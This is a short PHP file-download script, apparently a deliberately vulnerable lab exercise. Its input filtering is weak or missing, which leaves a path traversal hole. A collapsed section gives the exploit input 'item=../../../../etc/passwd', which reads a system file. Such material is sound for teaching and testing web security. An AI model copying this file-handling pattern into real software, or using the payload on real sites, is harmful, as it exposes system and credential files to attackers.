```php
<?php
ignore_user_abort(true);
set_time_limit(0);

$path = "/var/www/html/downloads/";

if ($_COOKIE["level"] == "2") {
    $patterns = array();
    $patterns[0] = '/\.\.\//';
    $dl_file = preg_replace($patterns, '', $_GET['item']); // simple file name validation
    $dl_file = filter_var($dl_file, FILTER_SANITIZE_URL); // Remove (more) invalid characters
    $fullPath = $path.$dl_file;
}
else {
    $fullPath = $path.$_GET['item'];
}


if ($fd = fopen ($fullPath, "r")) {
    $fsize = filesize($fullPath);
    $path_parts = pathinfo($fullPath);
    $ext = strtolower($path_parts["extension"]);
    switch ($ext) {
        case "pdf":
        header("Content-type: application/pdf");
        header("Content-Disposition: attachment; filename=\"".$path_parts["basename"]."\""); // use 'attachment' to force a file download
        break;
        // add more headers for other content types here
        default;
        header("Content-type: application/octet-stream");
        header("Content-Disposition: filename=\"".$path_parts["basename"]."\"");
        break;
    }
    header("Content-length: $fsize");
    header("Cache-control: private"); //use this to open files directly
    while(!feof($fd)) {
        $buffer = fread($fd, 2048);
        echo $buffer;
    }
}
fclose ($fd);
?>
```



<details>
  <summary><b>Exploite</b></summary>

  ```text
item=../../../../etc/passwd
  ```
</details>
